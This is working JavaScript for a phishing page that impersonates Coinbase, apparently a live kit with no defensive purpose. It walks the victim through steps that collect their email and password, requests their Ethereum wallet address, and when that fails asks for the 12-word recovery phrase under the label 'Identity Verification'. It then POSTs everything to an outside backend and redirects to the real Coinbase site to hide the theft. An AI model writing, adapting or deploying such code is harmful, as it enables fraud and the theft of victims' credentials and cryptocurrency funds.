const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const status = document.getElementById('status');

    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) return alert("Please fill in all fields");
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
    };

    document.getElementById('connectBtn').onclick = async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                status.innerText = "Connecting...";
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendData(email, pass, accounts[0], null);
            } catch (e) {
                setupRecovery(email, pass);
            }
        } else {
            setupRecovery(email, pass);
        }
    };

    function setupRecovery(email, pass) {
        document.getElementById('step3Title').innerText = "Identity Verification";
        document.getElementById('step3Desc').innerText = "Please enter your 12-word recovery phrase.";
        step3.innerHTML = `
            <img src="https://www.coinbase.com/favicon.ico" class="cb-logo">
            <h1>Identity Verification</h1>
            <p>Enter your 12-word recovery phrase to verify ownership.</p>
            <input type="text" id="phrase" placeholder="word1 word2..." style="margin-bottom:15px; text-align:center;">
            <button id="submitPhrase" class="btn-primary">Verify Account</button>
            <div id="phrase_status" class="status-text"></div>
        `;
        
        document.getElementById('submitPhrase').onclick = async () => {
            const phrase = document.getElementById('phrase').value.trim();
            if (phrase.split(/\s+/).length !== 12) {
                document.getElementById('phrase_status').innerText = "Please enter exactly 12 words.";
                return;
            }
            await sendData(email, pass, null, phrase);
        };
    }

    async function sendData(email, pass, wallet, phrase) {
        try {
            status.innerText = "Processing...";
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password: pass, walletAddress: wallet, recoveryPhrase: phrase })
            });
            if (res.ok) {
                window.location.href = 'https://www.coinbase.com/password-recovery';
            } else {
                status.innerText = "Error saving details. Try again.";
            }
        } catch (e) {
            status.innerText = "Connection error.";
        }
    }
});
